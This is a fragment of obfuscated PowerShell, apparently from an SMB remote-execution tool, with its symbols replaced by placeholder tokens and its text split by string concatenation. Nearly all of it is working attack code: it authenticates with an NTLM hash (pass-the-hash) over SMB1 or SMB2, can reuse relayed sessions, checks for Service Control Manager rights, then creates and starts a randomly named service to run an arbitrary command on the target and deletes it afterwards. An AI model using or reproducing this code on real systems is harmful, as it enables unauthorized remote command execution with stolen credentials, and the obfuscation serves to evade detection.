            wB69auth_NTLM_offset = [System.BitConverter]::GetBytes(wB69auth_domain_bytes.Length + wB69auth_username_bytes.Length + wB69auth_hostname_bytes.Length + 88)

            wB69HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5

            wB69HMAC_MD5.key = wB69NTLM_hash_bytes

            wB69username_and_target = wB69username.ToUpper()

            wB69username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes(wB69username_and_target)

            wB69username_'+'and_target_bytes += wB69auth_domain_bytes

            wB69NTLMv2_hash = wB69HMAC_MD5.ComputeHash(wB69username_and_target_bytes)

            wB69client_challenge = [String](1..8 uOva ForEach-Object {NDck{0:X2}NDck -f (Get-Random -Minimum 1 -Maximum 255)})

            wB69client_challenge_bytes = wB69client_challenge.Split(NDck NDck) uOva ForEach-Object{[Char][System.Convert]::ToInt16(wB69_,16)}


            wB69security_blob_bytes = 0x01,0x01,0x00,0x00,

                                    0x00,0x00,0x00,0x00 +

                                    wB69target_time_bytes +

                                    wB69client_challenge_bytes +

                                    0x00,0x00,0x00,0x00 +

                                    wB69target_details +

                                    0x00,0x00,0x00,0x00,

                                    0x00,0x00,0x00,0x00


            wB69server_challenge_and_security_blob_bytes = wB69NTLM_challenge + wB69security_blob_bytes

            wB69HMAC_MD5.key = wB69NTLMv2_hash

            wB69NTLMv2_response = wB69HMAC_MD5.ComputeHash(wB69server_challenge_and_security_blob_bytes)


            if(wB69SMB_signing)

            {

                wB69session_base_key = wB69HMAC_MD5.ComputeHash(wB69NTLMv2_response)

                wB69session_key = wB69session_base_key

                wB69HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256

                wB69HMAC_SHA256.key = wB69session_key

            }


            wB69NTLMv2_response = wB69NTLMv2_response + wB69security_blob_bytes

            wB69NTLMv2_response_length = [System.BitConverter]::GetBytes(wB69NTLMv2_response.Length)[0,1]

            wB69session_key_offset = [System.BitConverter]::GetBytes(wB69auth_domain_bytes.Length + wB69auth_username_bytes.Length + wB69auth_hostname_bytes.Length + wB69NTLMv2_response.Length + 88)


            wB69NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,

                                    0x03,0x00,0x00,0x00,

                                    0x18,0x00,

                                    0x18,0x00 +

                                    wB69auth_LM_offset +

                                    wB69NTLMv2_response_length +

                                    wB69NTLMv2_response_length +

                                    wB'+'69auth_NTLM_offset +

                                    wB69auth_domain_length +

                                    wB69auth_domain_length +

                                    wB69auth_domain_offset +

                                    wB69auth_username_length +

                                    wB69auth_username_length +

                                    wB69auth_username_offset +

                                    wB69auth_hostname_length +

                                    wB69auth_hostname_length +

                                    wB69auth_hostname_offset +

                                    wB69session_key_length +

                                    wB69session_key_length +

                                    wB69session_key_offset +

                                    wB69negotiate_flags +

                                    wB69auth_domain_bytes +

                                    wB69auth_username_bytes +

                                    wB69auth_hostname_bytes +

                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,

                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +

                                    wB69NTLMv2_response


            if(wB69SMB_version -eq utH9SMB1utH9)

            {

                wB69SMB_user_ID = wB69client_receive[32,33]

                wB69packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff wB69process_ID wB69SMB_user_ID


                if(wB69SMB_signing)

                {

         '+'           wB69packet_SMB_header[NDckFlags2NDck] = 0x05,0x48

                }


                wB69packet_SMB_header[NDckUserIDNDck] = wB69SMB_user_ID

                wB69packet_NTLMSSP_negotiate = New-PacketNTLMSSPAuth wB69NTLMSSP_response

                wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                wB69NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary wB69packet_NTLMSSP_negotiate      

                wB69packet_SMB_data = New-PacketSMBSessionSetupAndXRequest wB69NTLMSSP_negotiate

                wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69SMB_data.Length

                wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service

                wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data

            }

            else

            {

                wB69message_ID++

                wB69packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x01,0x00 wB69false wB69message_ID  wB69process_ID wB69tree_ID wB69session_ID

                wB69packet_NTLMSSP_auth = New-PacketNTLMSSPAuth wB69NTLMSSP_response

                wB69SMB2_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_header

                wB69NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary wB69packet_NTLMSSP_auth        

                wB69packet_SMB2_data = New-PacketSMB2SessionSetupRequest wB69NTLMSSP_auth

                wB69SMB2_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB2_data

                wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB2_header.Length wB69SMB2_data.Length

                wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service

                wB69client_send = wB69NetBIOS_session_service + wB69SMB2_header + wB69SMB2_data

            }


            try

            {

                wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                wB69client_stream.Flush()

                wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null


                if(wB69SMB_version -eq utH9SMB1utH9)

                {


                    if([System.BitConverter]::ToString(wB69client_receive['+'9..12]) -eq utH900-00-00-00utH9)

                    {

                        Write-Verbose NDck[+] wB69output_username successfully authenticated on wB69TargetNDck

                        wB69login_successful = wB69true

                    }

                    else

                    {

                        Write-Output NDck[!] wB69output_username failed to authenticate on wB69TargetNDck

                        wB69login_successful = wB69false

                    }


                }

                else

                {

                    if([System.BitConverter]::ToString(wB69client_receive[12..15]) -eq utH900-00-00-00utH9)

                    {

                        Write-Verbose NDck[+] wB69output_username successfully authenticated on wB69TargetNDck

                        wB69login_successful = wB69true

                    }

                    else

                    {

                        Write-Output NDck[!] wB69output_username failed to authenticate on wB69TargetNDck

                        wB69login_successful = wB69false

                    }


                }


            }

            catch

            {

                Write-Output NDck[-] wB69(wB69_.Exception.Message)NDck

            }


        }


    }


    if(wB69login_successful -or wB69inveigh_session)

    {


        if(wB69inveigh_session)

        {


            if(wB69inveigh_session -and wB69inveigh.session_lock_table[wB69session] -eq utH9lockedutH9)

            {

                Write-Output NDck[*] Pausing due to Inveigh Relay session lockNDck

                Start-Sleep -s 2

            }


            wB69inveigh.session_lock_table[wB69session] = utH9lockedutH9

            wB69client = wB69inveigh.session_socket_table[wB69session]

            wB69client_stream = wB69client.GetStream()

            wB69session_ID = wB69inveigh.session_table[wB69session]

            wB69message_ID =  wB69inveigh.session_message_ID_table[wB69session]

            wB69tree_ID = 0x00,0x00,0x00,0x00

            wB69SMB_signing = wB69false

        }


        wB69SMB_path = NDck9e09e0NDck + wB69Target + NDck9e0IPCwB69NDck


        if(wB69SMB_version -eq utH9SMB1utH9)

        {

            wB69SMB_path_bytes = [System.Text.Encoding]::UTF8.GetBytes(wB69SMB_path) + 0x00

        }

        else

        {

            wB69SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes(wB69SMB_path)

        }


        wB69named_pipe_UUID = 0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03


        if(!wB69Service)

        {

            wB69SMB_service_random = [String]::Join(NDck00-NDck,(1..20 uOva ForEach-Object{NDck{0:X2}-NDck -f (Get-Random -Minimum 65 -Maximum 90)}))

            wB69SMB_service = wB69SMB_service_random -replace NDck-00NDck,NDckNDck

            wB69SMB_service = wB69SMB_service.Substring(0,wB69SMB_service.Length - 1)

            wB69SMB_service = wB69SMB_service.Split(NDck-NDck) uOva ForEach-Object{[Char][System.Convert]::ToInt16(wB69_,16)}

            wB69SMB_service = New-Object System.String (wB69SMB_service,0,wB69SMB_service.Length)

            wB69SMB_service_random += utH900-00-00-00-00utH9

            wB69SMB_service_bytes = wB69SMB_service_random.Split(NDck-NDck) uOva ForEach-Object{[Char][System.Convert]::ToInt16(wB69_,16)}

        }

        else

        {

            wB69SMB_service = wB69Service

            wB69SMB_service_bytes = [System.Text.Encoding]::Unicode.GetBytes(wB69SMB_service)


            if([Bool](wB69SMB_service.Length % 2))

            {

                wB69SMB_service_bytes += 0x00,0x00

            }

            else

            {

                wB69SMB_service_bytes += 0x00,0x00,0x00,0x00

                

            }


        }

        

        wB69SMB_service_length = [System.BitConverter]::GetBytes(wB69SMB_service.Length + 1)


        if(wB69CommandCOMSPEC -eq utH9YutH9)

        {

            wB69Command = NDck%COMSPEC% /C ir8NDckNDck + wB69Command + NDckir8NDckNDck

        }

    '+'    else

        {

            wB69Command = NDckir8NDckNDck + wB69Command + NDckir8NDckNDck

        }


        [System.Text.Encoding]::UTF8.GetBytes(wB69Command) uOva ForEach-Object{wB69SMBExec_command += NDck{0:X2}-00-NDck -f wB69_}


        if([Bool](wB69Command.Length % 2))

        {

            wB69SMBExec_command += utH900-00utH9

        }

        else

        {

            wB69SMBExec_command += utH900-00-00-00utH9

        }    

        

        wB69SMBExec_command_bytes = wB69SMBExec_command.Split(NDck-NDck) uOva ForEach-Object{[Char][System.Convert]::ToInt16(wB69_,16)}  

        wB69SMBExec_command_length_bytes = [System.BitConverter]::GetBytes(wB69SMBExec_command_bytes.Length / 2)

        wB69SMB_split_index = 4256

        

        if(wB69SMB_version -eq utH9SMB1utH9)

        {

            wB69stage = utH9TreeConnectAndXRequestutH9


            while (wB69stage -ne utH9ExitutH9)

            {

            

                switch (wB69stage)

                {

            

                    utH9CheckAccessutH9

                    {


                        if([System.BitConverter]::ToString(wB69client_receive[108..111]) -eq utH900-00-00-00utH9 -and [System.BitConverter]::ToString(wB69client_receive[88..107]) -ne utH900-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00utH9)

                        {

                            wB69SMB_service_manager_context_handle = wB69client_receive[88..107]


                            if(wB69SMB_execute)

                            {

                                Write-Verbose NDckwB69output_username has Service Control Manager write privilege on wB69TargetNDck  

                                wB69packet_SCM_data = New-PacketSCMCreateServiceW wB69SMB_service_manager_context_handle wB69SMB_service_bytes wB69SMB_service_length wB69SMBExec_command_bytes wB69SMBExec_command_length_bytes

                                wB69SCM_data = ConvertFrom-PacketOrderedDictionary wB69packet_SCM_data


                                if(wB69SCM_data.Length -lt wB69SMB_split_index)

                                {

                                    wB69stage = utH9CreateServiceWutH9

                                }

                                else

                                {

                                    wB69stage = utH9CreateServiceW_FirstutH9

                                }


                            }

                            else

                            {

                                Write-Output NDckwB69output_username has Service Control Manager write privilege on wB69TargetNDck

                                wB69SMB_close_service_handle_stage = 2

                                wB69stage = utH9Cl'+'oseServiceHandleutH9

                            }


                        }

                        elseif([System.BitConverter]::ToString(wB69client_receive[108..111]) -eq utH905-00-00-00utH9)

                        {

                            Write-Output NDck[-] wB69output_username does not have Service Control Manager write privilege on wB69TargetNDck

                            wB69stage = utH9ExitutH9

                        }

                        else

                        {

                            Write-Output NDck[-] Something went wrong with wB69TargetNDck

                            wB69stage = utH9ExitutH9

                        }


                    }


                    utH9CloseRequestutH9

                    {

                        wB69packet_SMB_header = New-PacketSMBHeader 0x04 0x18 0x07,0xc8 wB69SMB_tree_ID wB69process_ID wB69SMB_user_ID


                        if(wB69SMB_signing)

                        {

                            wB69packet_SMB_header[NDckFlags2NDck] = 0x05,0x48

                            wB69SMB_signing_counter = wB69SMB_signing_counter + 2

                            [Byte[]]wB69SMB_signing_sequence = [System.BitConverter]::GetBytes(wB69SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signing_sequence

                        }


                        wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header   

                        wB69packet_SMB_data = New-PacketSMBCloseRequest 0x00,0x40

                        wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69SMB_data.Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB_sign = wB69session_key + wB69SMB_header + wB69SMB_data 

                            wB69SMB_signature = wB69MD5.ComputeHash(wB69SMB_sign)

                            wB69SMB_signature = wB69SMB_signature[0..7]

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signature

                            wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        wB69stage = utH9TreeDisconnectutH9

                    }


                    utH9CloseServiceHandleutH9

                    {


                        if(wB69SMB_close_service_handle_stage -eq 1)

                        {

                            Write-Verbose NDckService wB69SMB_service deleted on wB69TargetNDck

                            wB69SMB_close_service_handle_stage++

                            wB69packet_SCM_data = New-PacketSCMCloseServiceHandle wB69SMB_service_context_handle

                        }

                        else

                        {

                            wB69stage = utH9CloseRequestutH9

                            wB69packet_SCM_data = New-PacketSCMCloseServiceHandle wB69SMB_service_manager_context_handle

                        }


                        wB69packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 wB69SMB_tree_ID wB69process_ID wB69SMB_user_ID


                        if(wB69SMB_signing)

                        {

                            wB69packet_SMB_header[NDckFlags2NDck] = 0x05,0x48

                            wB69SMB_signing_counter = wB69SMB_signing_counter + 2 

                            [Byte[]]wB69SMB_signing_sequence = [System.BitConverter]::GetBytes(wB69SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signing_sequence

                        }


                        wB69SCM_data = ConvertFrom-PacketOrderedDictionary wB69packet_SCM_data

                        wB69packet_RPC_data = New-PacketRPCRequest 0x03 wB69SCM_data.Length 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00

                        wB69RPC_data = ConvertFrom-PacketOrderedDictionary wB69packet_RPC_data

                        wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header   

                        wB69packet_SMB_data = New-PacketSMBWriteAndXRequest wB69SMB_FID (wB69RPC_data.Length + wB69SCM_data.Length)

                        wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                        wB69RPC_data_length = wB69SMB_data.Length + wB69SCM_data.Length + wB69RPC_data.Length

     '+'                   wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69RPC_data_length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB_sign = wB69session_key + wB69SMB_header + wB69SMB_data + wB69RPC_data + wB69SCM_data

                            wB69SMB_signature = wB69MD5.ComputeHash(wB69SMB_sign)

                            wB69SMB_signature = wB69SMB_signature[0..7]

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signature

                            wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data + wB69RPC_data + wB69SCM_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                    }


                    utH9CreateAndXRequestutH9

                    {

                        wB69SMB_named_pipe_bytes = 0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00 # 9e0svcctl

                        wB69SMB_tree_ID = wB69client_receive[28,29]

                        wB69packet_SMB_header = New-PacketSMBHeader 0xa2 0x18 0x02,0x28 wB69SMB_tree_ID wB69process_ID wB69SMB_user_ID


                        if(wB69SMB_signing)

                        {

                            wB69packet_SMB_header[NDckFlags2NDck] = 0x05,0x48

                            wB69SMB_signing_counter = wB69SMB_signing_counter + 2

                            [Byte[]]wB69SMB_signing_sequence = [System.BitConverter]::GetBytes(wB69SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signing_sequence

                        }


                        wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header   

                        wB69packet_SMB_data = New-PacketSMBNTCreateAndXRequest wB69SMB_named_pipe_bytes

                        wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69SMB_data.Length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB_sign = wB69session_key + wB69SMB_header + wB69SMB_data 

                            wB69SMB_signature = wB69MD5.ComputeHash(wB69SMB_sign)

                            wB69SMB_signature = wB69SMB_signature[0..7]

                            wB69packet'+'_SMB_header[NDckSignatureNDck] = wB69SMB_signature

                            wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        wB69stage = utH9RPCBindutH9

                    }

                  

                    utH9CreateServiceWutH9

                    {

                        wB69packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 wB69SMB_tree_ID wB69process_ID wB69SMB_user_ID

                        

                        if(wB69SMB_signing)

                        {

                            wB69packet_SMB_header[NDckFlags2NDck] = 0x05,0x48

                            wB69SMB_signing_counter = wB69SMB_signing_counter + 2 

                            [Byte[]]wB69SMB_signing_sequence = [System.BitConverter]::GetBytes(wB69SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signing_sequence

                        }


                        wB69packet_SCM_data = New-PacketSCMCreateServiceW wB69SMB_service_manager_context_handle wB69SMB_service_bytes wB69SMB_service_length wB69SMBExec_command_bytes wB69SMBExec_command_length_bytes

                        wB69SCM_data = ConvertFrom-PacketOrderedDictionary wB69packet_SCM_data

                        wB69packet_RPC_data = New-PacketRPCRequest 0x03 wB69SCM_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00

                        wB69RPC_data = ConvertFrom-PacketOrderedDictionary wB69packet_RPC_data

                        wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header   

                        wB69packet_SMB_data = New-PacketSMBWriteAndXRequest wB69SMB_FID (wB69RPC_data.Length + wB69SCM_data.Length)

                        wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                             

                        wB69RPC_data_length = wB69SMB_data.Length + wB69SCM_data.Length + wB69RPC_data.Length

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69RPC_data_length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB_sign = wB69session_key + wB69SMB_header + wB69SMB_data + wB69RPC_data + wB69SCM_data

                            wB69SMB_signature = wB69MD5.ComputeHash(wB69SMB_sign)

                            wB69SMB_signature = wB69SMB_signature[0..7]

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signature

                            wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data + wB69RPC_data + wB69SCM_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        wB69stage = utH9ReadAndXRequestutH9

                        wB69stage_next = utH9StartServiceWutH9

                '+'    }


                    utH9CreateServiceW_FirstutH9

                    {

                        wB69SMB_split_stage_final = [Math]::Ceiling(wB69SCM_data.Length / wB69SMB_split_index)

                        wB69packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 wB69SMB_tree_ID wB69process_ID wB69SMB_user_ID


                        if(wB69SMB_signing)

                        {

                            wB69packet_SMB_header[NDckFlags2NDck] = 0x05,0x48

                            wB69SMB_signing_counter = wB69SMB_signing_counter + 2 

                            [Byte[]]wB69SMB_signing_sequence = [System.BitConverter]::GetBytes(wB69SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signing_sequence

                        }


                        wB69SCM_data_first = wB69SCM_data[0..(wB69SMB_split_index - 1)]

                        wB69packet_RPC_data = New-PacketRPCRequest 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 wB69SCM_data_first

                        wB69packet_RPC_data[NDckAllocHintNDck] = [System.BitConverter]::GetBytes(wB69SCM_data.Length)

                        wB69SMB_split_index_tracker = wB69SMB_split_index

                        wB69RPC_data = ConvertFrom-PacketOrderedDictionary wB69packet_RPC_data

                        wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                        wB69packet_SMB_data = New-PacketSMBWriteAndXRequest wB69SMB_FID wB69RPC_data.Length

                        wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data     

                        wB69RPC_data_length = wB69SMB_data.Length + wB69RPC_data.Length

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69RPC_data_length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                   '+'     {

                            wB69SMB_sign = wB69session_key + wB69SMB_header + wB69SMB_data + wB69RPC_data

                            wB69SMB_signature = wB69MD5.ComputeHash(wB69SMB_sign)

                            wB69SMB_signature = wB69SMB_signature[0..7]

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signature

                            wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data + wB69RPC_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null


                        if(wB69SMB_split_stage_final -le 2)

                        {

                            wB69stage = utH9CreateServiceW_LastutH9

                        }

                        else

                        {

                            wB69SMB_split_stage = 2

                            wB69stage = utH9CreateServiceW_MiddleutH9

                        }


                    }


                    utH9CreateServiceW_MiddleutH9

                    {

                        wB69SMB_split_stage++

                        wB69packet_SMB_header = New-PacketSMBHea'+'der 0x2f 0x18 0x05,0x28 wB69SMB_tree_ID wB69process_ID wB69SMB_user_ID


                        if(wB69SMB_signing)

                        {

                            wB69packet_SMB_header[NDckFlags2NDck] = 0x05,0x48

                            wB69SMB_signing_counter = wB69SMB_signing_counter + 2 

                            [Byte[]]wB69SMB_signing_sequence = [System.BitConverter]::GetBytes(wB69SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signing_sequence

                        }


                        wB69SCM_data_middle = wB69SCM_data[wB69SMB_split_index_tracker..(wB69SMB_split_index_tracker + wB69SMB_split_index - 1)]

                        wB69SMB_split_index_tracker += wB69SMB_split_index

                        wB69packet_RPC_data = New-PacketRPCRequest 0x00 0 0 0 0x02,0x00,0x00,0x0'+'0 0x00,0x00 0x0c,0x00 wB69SCM_data_middle

                        wB69packet_RPC_data[NDckAllocHintNDck] = [System.BitConverter]::GetBytes(wB69SCM_data.Length - wB69SMB_split_index_tracker + wB69SMB_split_index)

                        wB69RPC_data = ConvertFrom-PacketOrderedDictionary wB69packet_RPC_data

                        wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                        wB69packet_SMB_data = New-PacketSMBWriteAndXRequest wB69SMB_FID wB69RPC_data.Length

                        wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data     

                    '+'    wB69RPC_data_length = wB69SMB_data.Length + wB69RPC_data.Length

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69RPC_data_length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB_sign = wB69session_key + wB69SMB_header + wB69SMB_data + wB69RPC_data

                            wB69SMB_signature = wB69MD5.ComputeHash(wB69SMB_sign)

                            wB69SMB_signature = wB69SMB_signature[0..7]

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signature

                            wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data + wB69RPC_data

                        wB69client_stream.Write(wB69client_sen'+'d,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null


                        if(wB69SMB_split_stage -ge wB69SMB_split_stage_final)

                        {

                            wB69stage = utH9CreateServiceW_LastutH9

                        }

                        else

                        {

                            wB69stage = utH9CreateServiceW_MiddleutH9

                        }


                    }


                    utH9CreateServiceW_LastutH9

                    {

                        wB69packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x48 wB69SMB_tr'+'ee_ID wB69process_ID wB69SMB_user_ID


                        if(wB69SMB_signing)

                        {

                            wB69packet_SMB_header[NDckFlags2NDck] = 0x05,0x48

                            wB69SMB_signing_counter = wB69SMB_signing_counter + 2 

                            [Byte[]]wB69SMB_signing_sequence = [System.BitConverter]::GetBytes(wB69SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signing_sequence

                        }


                        wB69SCM_data_last = wB69SCM_data[wB69SMB_split_index_tracker..wB69SCM_data.Length]

                        wB69packet_RPC_data = New-PacketRPCRequest 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 wB69SCM_data_last

                        wB69RPC_data = ConvertFrom-PacketOrderedDictionary wB69packet_RPC_data 

                        wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header   

                        wB69packet_SMB_data = New-PacketSMBWriteAndXRequest wB69SMB_FID wB69RPC_data.Length

                        wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data

                        wB69RP'+'C_data_length = wB69SMB_data.Length + wB69RPC_data.Length

                        wB69packet_NetBIOS_session_service = New-PacketNetBIOSSessionService wB69SMB_header.Length wB69RPC_data_length

                        wB69NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary wB69packet_NetBIOS_session_service


                        if(wB69SMB_signing)

                        {

                            wB69SMB_sign = wB69session_key + wB69SMB_header + wB69SMB_data + wB69RPC_data

                            wB69SMB_signature = wB69MD5.ComputeHash(wB69SMB_sign)

                            wB69SMB_signature = wB69SMB_signature[0..7]

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signature

                            wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header

                        }


                        wB69client_send = wB69NetBIOS_session_service + wB69SMB_header + wB69SMB_data + wB69RPC_data

                        wB69client_stream.Write(wB69client_send,0,wB69client_send.Length) > wB69null

                        wB69client_stream.Flush()

                        wB69client_stream.Read(wB69client_receive,0,wB69client_receive.Length) > wB69null

                        wB69stage = utH9ReadAndXRequestutH9

               '+'         wB69stage_next = utH9StartServiceWutH9

                    }


                    utH9DeleteServiceWutH9

                    { 


                        if([System.BitConverter]::ToString(wB69client_receive[88..91]) -eq utH91d-04-00-00utH9)

                        {

                            Write-Output NDck[+] Command executed with service wB69SMB_service on wB69TargetNDck

                        }

                        elseif([System.BitConverter]::ToString(wB69client_receive[88..91]) -eq utH902-00-00-00utH9)

                        {

                            Write-Output NDck[-] Service wB69SMB_service failed to start on wB69TargetNDck

                        }


                        wB69packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 wB69SMB_tree_ID wB69process_ID wB69SMB_user_ID


                        if(wB69SMB_signing)

                        {

                            wB69packet_SMB_header[NDckFlags2NDck] = 0x05,0x48

                            wB69SMB_signing_counter = wB69SMB_signing_counter + 2 

                            [Byte[]]wB69SMB_signing_sequence = [System.BitConverter]::GetBytes(wB69SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            wB69packet_SMB_header[NDckSignatureNDck] = wB69SMB_signing_sequence

                        }


                        wB69packet_SCM_data = New-PacketSCMDeleteServiceW wB69SMB_service_context_handle

                        wB69SCM_data = ConvertFrom-PacketOrderedDictionary wB69packet_SCM_data

                        wB69packet_RPC'+'_data = New-PacketRPCRequest 0x03 wB69SCM_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00

                        wB69RPC_data = ConvertFrom-PacketOrderedDictionary wB69packet_RPC_data

                        wB69SMB_header = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_header   

                        wB69packet_SMB_data = New-PacketSMBWriteAndXRequest wB69SMB_FID (wB69RPC_data.Length + wB69SCM_data.Length)

                        wB69SMB_data = ConvertFrom-PacketOrderedDictionary wB69packet_SMB_data 

